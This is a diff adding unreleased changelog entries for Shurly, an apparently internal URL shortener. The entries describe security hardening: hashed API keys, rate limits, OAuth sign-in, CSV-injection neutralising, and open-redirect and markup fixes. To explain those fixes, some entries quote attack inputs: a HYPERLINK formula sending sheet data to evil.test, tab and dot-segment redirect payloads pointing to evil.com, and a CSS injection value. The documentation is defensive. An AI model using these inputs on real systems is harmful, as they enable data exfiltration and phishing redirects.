@@ -26,6 +26,277 @@ implementation lifecycle and is independent of the URL version segment.
 
 ## [Unreleased]
 
+### Security — API keys are stored as a hash and shown once (Phase 6.3)
+- **The database no longer holds API keys.** It keeps each key's SHA-256 hash and first
+  12 characters (`users.api_key_hash`, `users.api_key_prefix`). Migration `0007` moves every
+  existing key there and empties `users.api_key`, which a later release drops. Keys made before
+  keep working. A key is looked up by its hash, through a unique index, so the key itself is never
+  compared.
+- **`GET /api/v1/auth/me` no longer returns `api_key`.** It returns `has_api_key` and
+  `api_key_prefix` instead. This breaks the versioning policy above, on purpose: the key can't be
+  returned once only its hash is kept. The only client that read the field, Settings → API & MCP,
+  changes in the same release. `/auth/me` is also the MCP's `get_current_user_info` tool, which
+  used to put the key in an assistant's context whenever it asked who you are.
+- **The key is shown once, by `POST /api/v1/auth/api-key/generate`.** Settings says "copy it now:
+  it won't be shown again". Later it shows how the key starts, and Regenerate. "Copy with my
+  key" is there right after you generate a key; otherwise the command keeps `<your API key>`.
+- **New keys start with `shurly_`**, so people and secret scanners can recognise a leaked one. A
+  token with two dots is still a JWT, whatever it starts with.
+- While `0007` rolls out, the task still on the previous release answers 401 to API keys
+  (`DEPLOYMENT.md` § API keys).
+
+### Changed — the frontend deploy, ready for S3 + CloudFront (Phase 4.10)
+- **`deploy-frontend.yml` rewritten for the chosen setup:**
+  - OIDC with its own least-privilege role (`AWS_FRONTEND_DEPLOY_ROLE_ARN`), no access keys.
+  - The production values: `PUBLIC_API_URL=https://shurly.griddo.io`, `PUBLIC_SHORT_DOMAIN=s.griddo.io`.
+  - Tests and the build before any upload.
+  - Only the hashed `_astro/` files are cached for good. Pages, favicons, `og-image.png` and the manifest
+    revalidate, where before every non-HTML file was cached for a year.
+  - A CloudFront invalidation after each deploy.
+  - It runs on merges to `main` that touch the frontend, and while `FRONTEND_BUCKET` is unset it says
+    it skipped instead of failing.
+- **CI builds the frontend:** `npm ci`, `npm test` and `npm run build` (astro check) on every PR.
+- **A CloudFront Function** (`infra/cloudfront/static-paths.js`, with tests) gives a private bucket its
+  directory indexes and adds the missing trailing slash, and it can't redirect off the site.
+- **DEPLOYMENT.md § Frontend hosting** covers the distribution's behaviours for the app, the API and the MCP,
+  the us-east-1 certificate, the bucket, the deploy role's policies, cutover and rollback, and two open
+  decisions: error pages, and client IPs behind CloudFront.
+
+### Fixed — a long value from outside a schema no longer fails with a 500
+- **A link to a page with a long title is created.** The title fetched for the preview
+  went into `og_title` (255 characters) as it was, and PostgreSQL refused a longer one:
+  a 500 on creating the link, on refreshing its preview, or on the live preview's
+  suggestion. Fetched titles are cut to the column now.
+- **A redirect with a long `X-Forwarded-For` redirects.** Behind a trusted proxy, the
+  address stored with a visit or an orphan visit came from that header, and a value
+  longer than the column (50) was a 500 on the redirect itself. Addresses are cut to
+  their column (`fit`, `server/utils/columns.py`).
+- **The MCP's `create_campaign_from_rows` refuses a name over 255 characters**, as the
+  API does; it writes through the ORM, past the API's schema, and a longer name was a
+  500. A test pins every request field stored in a bounded column to a `max_length`
+  within that column, so the gap can't come back unnoticed.
+
+### Changed — CORS allows only what the frontend uses
+- **No credentials**, and only the methods (`GET`, `POST`, `PUT`, `PATCH`, `DELETE`) and
+  request headers (`Authorization`, `Content-Type`, `X-Request-Id`) the API uses, instead
+  of `*`: the frontend sends a bearer token, never cookies. It can now read
+  `Retry-After` and `X-Request-Id` from a response. Origins are unchanged.
+- In production the frontend and the API will share an origin (`shurly.griddo.io`, once
+  the frontend is hosted, 4.10), so `CORS_ORIGINS` needs no entry there; the defaults
+  are for the dev server (`localhost:4232`).
+
+### Added — the user manual, starting with how to connect Claude (Phase 5.9)
+- **`/manual/`**: Markdown in `frontend/src/content/manual/` (an Astro content collection),
+  rendered at build time. Its first page, "Connect Claude to Shurly", covers Claude Code and
+  claude.ai / Claude Desktop: signing in with Google first, an API key as the route that works on
+  its own, and what to do when something goes wrong.
+- **Settings → API & MCP shows the same page**, so the app and the manual can't drift, with
+  "Copy with my key": it builds the API key command when clicked, from the key the page already
+  holds, and never writes the key into the page, a URL or storage.
+- **The MCP address comes from `PUBLIC_MCP_URL`** at build time, or the API's `/mcp/`, always
+  with the trailing slash people must use.
+- **Fixed:** the API key panel wrote the full key into its Copy buttons' `data-copy` attributes
+  when the page loaded, behind the masked display. The buttons now copy from memory when
+  clicked.
+
+### Changed — Shurly's public host is `shurly.griddo.io`
+- **`shurly.griddo.io` serves the web, the app, the API and the MCP** (decided 2026-09-28):
+  `MCP_PUBLIC_URL=https://shurly.griddo.io/mcp`, the Google redirect URIs
+  `https://shurly.griddo.io/api/v1/auth/google/callback` and `…/mcp/auth/callback`, and
+  `FRONTEND_URL=https://shurly.griddo.io`. It's a second host on ALB rule 12, so the rule sync needs
+  no change. The deploy's smoke test checks it. `go.griddo.io` is for short links only (Phase 8);
+  `s.griddo.io` stays for tests until then and is deleted at the cutover.
+- `mcp_server/README.md`: `claude mcp add` takes the URL as a positional argument, not `--url`.
+
+### Security — rate limits on the login and the sign-in endpoints (Phase 6.3)
+- **What anyone can call is limited per client IP**, counted in the database so both
+  tasks share the counts (the new `rate_limits` table, migration `0006`): the password
+  login, whose every attempt runs a bcrypt check on the tasks that also serve
+  redirects, and the Google and MCP sign-in endpoints, each of which writes a row.
+  `/mcp/register` and `/mcp/token` get their own, generous count, since claude.ai calls
+  them from Anthropic's addresses. Redirects, anything signed in and CORS preflights
+  aren't limited.
+- **Failed password logins are also limited per address** (10 per 15 minutes by
+  default), wherever they come from. Only failures count, so the right password isn't
+  counted with a guesser's. Anyone can lock an address's password login for the window,
+  but signing in with Google stays open, and an address without an account locks the
+  same way, so a 429 tells nothing about who has one.
+- Over a limit: `429` with `Retry-After`. Google's sign-in goes back to the login page
+  with `#error=rate_limited`, which the frontend now explains. The event log records
+  `http.rate_limited {path, limit}`, without the IP or the address. If the database
+  can't count, requests go through and `rate_limit.store_failed` is logged.
+- New settings: `RATE_LIMIT_LOGIN_PER_IP`, `RATE_LIMIT_LOGIN_FAILURES_PER_ACCOUNT`,
+  `RATE_LIMIT_SIGN_IN_PER_IP`, `RATE_LIMIT_MCP_CLIENTS_PER_IP` (0 turns one off).
+  They key on the client IP, so `TRUSTED_PROXIES` must name the ALB.
+
+### Security — a client can't choose the IP it's recorded under
+- **`X-Forwarded-For` is read from the right**, skipping the proxies in
+  `TRUSTED_PROXIES`. The ALB appends the address it saw to whatever the client sent,
+  and the resolver took the leftmost entry, the client's own claim: anyone could choose
+  the address a visit was recorded under, and would have reset a per-IP rate limit
+  with every request.
+
+### Security — CSV exports can't carry spreadsheet formulas
+- **The campaign export and the campaign recipients CSV neutralize cells that start
+  like a formula** (`=`, `+`, `-`, `@`, a tab or a carriage return) with a leading
+  single quote, which spreadsheets show as text (OWASP "CSV Injection"). Recipient data
+  comes from uploaded CSVs, so a recipient named `=HYPERLINK("https://evil.test/?"&A1,…)`
+  would have become a live formula for whoever opened the export, able to send the
+  sheet's contents elsewhere. Column names too, and the other analytics CSVs go through
+  the same writer (`spreadsheet_safe`, `server/utils/csv_export.py`).
+- **An export uploaded back as a campaign keeps its data:** the CSV import drops that
+  quote again. A phone number like `+34 600…` also gets the quote in an export; that's
+  the usual trade-off.
+- **Any campaign name exports.** The download's filename came from the campaign's name
+  as it was: a name outside latin-1 (`Q4 🚀`, `东京`) made the export fail with a 500,
+  and quotes, CR/LF or slashes went into the `Content-Disposition` header. Every CSV now
+  sends a plain ASCII `filename` and the real name in `filename*` (RFC 6266/5987,
+  `content_disposition`), which browsers prefer. The response isn't cached
+  (`Cache-Control: no-store`), like the other CSVs.
+
+### Security — the frontend's markup, audited (Phase 6.3)
+- **Every raw `innerHTML` that carried data now goes through the escaping `html` tag and
+  `setHTML`**: toasts, confirm dialogs, form alerts, the tag picker, charts and their
+  tooltips, the link page and the new-link preview. They were escaped by hand before; nothing
+  exploitable was found. Two raw sinks remain, each explained in the code and the test:
+  `setHTML` itself, and the QR code (numbers and fixed colours only).
+- **Links and images from data go through `safeUrl`** (http and https only, anything else is
+  `#`), now also the short link after creating one and the tracking pixel's snippet. A
+  `javascript:` destination, OG image or redirect target stays inert even in rows the API's
+  own checks never saw.
+- **A tag colour must be a hex colour to reach a `style` attribute**, so a stored value can't
+  add CSS (`#fff;background:…`).
+- **Regression tests** (`cd frontend && npm test`, in CI): a scan of `frontend/src` fails on
+  any new raw HTML sink, `raw()` on data, or `href`/`src` built from a URL without
+  `safeUrl`; unit tests pin the escaping and `safeUrl` against `javascript:`, `data:` and
+  obfuscated schemes.
+- A copy button clicked twice within two seconds no longer stays on "Copied!", and a loading
+  button gets its own content back (nodes, not re-parsed markup).
+
+### Added — MCP clients sign in with Google (Phase 5.8)
+- **The MCP takes Google sign-ins as well as API keys and JWTs**, so Shurly can be
+  added as a claude.ai custom connector, whose only way to authenticate is OAuth.
+  Existing setups with `--header "Authorization: Bearer <api key>"` don't change.
+  fastmcp's OAuth proxy runs the flow: client registration (DCR and Client ID
+  Metadata Documents), a consent page, then Google. Its endpoints are under `/mcp/`,
+  and the discovery documents (RFC 9728, RFC 8414) are at `/.well-known/…/mcp` at the
+  root. A request without a token now gets a 401 pointing at them.
+- **The same account, by the same rules, as on the web.** Google's ID token is
+  checked like the web's, and the account comes from the web sign-in's rules: the
+  organization's Workspace only, a verified address, the domain gate and
+  membership, `account_conflict`, and the pre-hijack lockout. A refused sign-in gets
+  no token (`invalid_grant`). Closing an account in Shurly refuses its MCP sign-ins
+  at once, requests and refreshes alike; a suspension at Google takes up to a minute
+  (a successful check with Google is kept 60 seconds).
+- **Survives two tasks and every deploy.** What the proxy keeps (registrations,
+  sign-ins in progress, codes, Google's tokens) lives in the new `mcp_oauth_store`
+  table (migration `0005`), encrypted; its tokens are signed with a key of its own,
+  never the Google client secret.
+- **Only the clients we target can register:** claude.ai's (and claude.com's)
+  callback and loopback on any port for Claude Code. Any other app is refused, so it
+  can't ask a Griddo person to consent (consent phishing).
+- **New settings:** `MCP_PUBLIC_URL`, `MCP_OAUTH_SIGNING_KEY` and
+  `MCP_OAUTH_ALLOWED_REDIRECT_URIS`. Until the first two are set, with the Google
+  client, the MCP works as before. The Google client needs the extra redirect URI
+  `{MCP_PUBLIC_URL}/auth/callback`. DEPLOYMENT.md § The MCP.
+
+### Added — Removed people, in Settings → Organization (Phase 3.14.3)
+- **Owners can move someone's personal links later, not only right after removing them.**
+  `GET /api/v1/organization/removed-members` lists the people removed from the organization
+  (closed accounts on its email domain; one off the domain was never in it, so its address
+  isn't shown), with how many personal links (a campaign's included) and campaigns each still
+  owns: what `adopt-personal-links` would move. Most first, then by email. Owners only (403
+  otherwise), and kept out of the MCP like the move itself.
+- Settings → Organization shows them to owners under Members, each with "Move to …", or
+  "Nothing left to move". The section is left out when nobody was removed.
+- The organization's copy says "signs in" instead of "signs up": accounts come from signing in
+  with Google since 3.13.
+
+### Security — after logging in, `?next=` can't send you to another site
+- **The login page's `next` is resolved the way the browser resolves it**, not judged by its
+  first characters. Browsers drop tabs and line breaks from URLs, so
+  `/login/?next=/%09/evil.com` passed the old check and sent someone to `evil.com` right after
+  logging in; dot segments (`/.//evil.com`) did the same. Control characters and backslashes are
+  refused outright, and the path that comes out must still start with a single `/` on this site.
+  The same check covers the path kept across the Google round trip. Covered by the frontend's
+  first unit tests (`cd frontend && npm test`, on Node's WHATWG URL parser), now a CI job.
+- **The login and password forms `POST` if they're submitted before their script loads**, so the
+  password can't end up in the address bar, the history or the host's logs.
+
+### Added — Google sign-in in the frontend (Phase 3.13.5)
+- **"Sign in with Google" on the login page.** It leaves for
+  `GET /api/v1/auth/google/start`; Google's answer comes back as `/login/#code=…`, which
+  the page trades by `POST /api/v1/auth/google/exchange` for the session, so the token
+  never travels in a URL, and the fragment is cleared right away. `#error=…` codes get
+  plain-language messages. Where you were going survives the round trip (kept in
+  `sessionStorage`, same-site paths only). Email and password login stays, and "Forgot
+  password?" now says to sign in with Google and set a new one.
+- **No sign-up page**: accounts are created by signing in with Google. `/register/`
+  redirects to the login page, and the landing page's "Get started" buttons lead there.
+- **Settings → Account → Password**: set, change or remove a password. Replacing one
+  takes the current password; with Google it's optional, and without it the change
+  needs a recent sign-in, the way back from a forgotten one. Without Google the password
+  is the only way in, so removing it is locked with the reason. When the session is too
+  old for the change, a button signs you in with Google again and brings you back to
+  Settings.
+
+### Security — a refused login no longer tells whether the address has an account
+- **`POST /api/v1/auth/login` takes as long for an unknown address, or an account without a
+  password, as for a wrong password.** It returned before checking any password, so the response
+  time showed which addresses have an account. It now runs a dummy bcrypt check on those paths
+  (passlib's `dummy_verify`).
+
+### Added — sign in with Google (Phase 3.13.2)
+- **People at Griddo sign in with their Google Workspace account.** `GET /api/v1/auth/google/start`
+  sends the browser to Google (OpenID Connect, authorization code with PKCE), and
+  `GET /api/v1/auth/google/callback` checks the result and sends the browser to
+  `{FRONTEND_URL}/login/#code=…`. The page trades that one-time code for the usual JWT at
+  `POST /api/v1/auth/google/exchange`, so the JWT never travels in a URL. The contract with the
+  frontend is in the docstring of `server/app/google_auth.py`.
+- **Only the organization's accounts get in.** The ID token is checked on the server: signature
+  against Google's keys, audience, issuer and expiry (google-auth), a verified address, and an `hd`
+  claim equal to `ORGANIZATION_DOMAIN`. The `hd` sent to Google is only a hint.
+- **A sign-in can't be finished in another browser, or twice.** The `state` is stored hashed, works
+  once, expires in 10 minutes and must match an HttpOnly cookie set by `/start`. The one-time code
+  is stored hashed, works once and expires in 60 seconds.
+- **An account is recognised by Google's `sub`**, in the new `user_identities` table (migration
+  `0004`), so an address change on Google's side keeps the account. The first sign-in makes the
+  account and joins the organization; the 3.14.2 domain gate still applies. An address whose
+  account is linked to another Google account is refused (`account_conflict`), never linked.
+- **An account made before Google is taken back from whoever made it.** The open sign-up never
+  verified addresses, so when such an account first signs in with Google it's linked, but its
+  password is cleared, its API key revoked and every existing session ended (account
+  pre-hijacking). Logged as `auth.identity_linked`.
+- **Event log:** `auth.login` `{method, user_id}` for every sign-in, with Google or a password, and
+  `auth.google_refused` `{reason}`. Never an address, a token or a code.
+- **New settings:** `GOOGLE_CLIENT_ID`, `GOOGLE_CLIENT_SECRET`, `GOOGLE_REDIRECT_URI` and
+  `FRONTEND_URL`. Until they're set, the Google endpoints send the browser back with
+  `#error=google_unavailable`, or answer `503` without `FRONTEND_URL`, and everything else works as
+  before. DEPLOYMENT.md § Sign in with Google has the Google Cloud setup.
+
+### Added — an optional password, set by the account's owner (Phase 3.13.3)
+- **`PUT /api/v1/auth/password` sets or replaces the password; `DELETE` removes it.** Only from a
+  signed-in session: an API key gets a `403`, so a leaked key can't become a password. Without the
+  current password, the sign-in must be at most 10 minutes old, or it's a `403` with
+  `{"code": "reauth_required", …}`: that's the way back from a forgotten password (sign in with
+  Google, set a new one). Removing is refused (`409`) when the account doesn't sign in with Google.
+  Logged as `auth.password_set` and `auth.password_removed`. Neither endpoint is an MCP tool.
+- **`GET /api/v1/auth/me` says `has_password` and `has_google`**, for Settings → Account.
+- **Sessions can be ended.** JWTs now carry `iat`, and an account's `sessions_valid_from` refuses
+  the ones issued before it, in the API and the MCP alike. Tokens from before this release have no
+  `iat` and keep working until their account gets a cutoff, so nobody is logged out.
+- `users.password_hash` may be NULL (migration `0004`): an account made through Google has no
+  password. `POST /auth/login` answers `401` for it, and `POST /auth/change-password` a `409` that
+  points to `PUT /api/v1/auth/password`. During the rollout, the previous release answers `500` to a
+  password login for an account whose password the new one has just cleared.
+
+### Removed — sign-up with a password (Phase 3.13.2)
+- **`POST /api/v1/auth/register` answers `404`** and is gone from the API docs and the MCP (the
+  `register` tool), unless `ALLOW_PASSWORD_SIGNUP=true`, which is for local development and tests,
+  never production. The app logs `auth.password_signup_enabled` at startup when it's on. Accounts
+  come from signing in with Google. A deliberate break of the versioning policy above: anyone could
+  make an account on a Griddo domain (retro R1).
+
 ### Added — move a removed person's personal links from Settings (Phase 3.14)
 - **When an owner removes someone** in Settings → Organization, a follow-up asks whether
   to move that person's personal links and campaigns to the organization, so the team
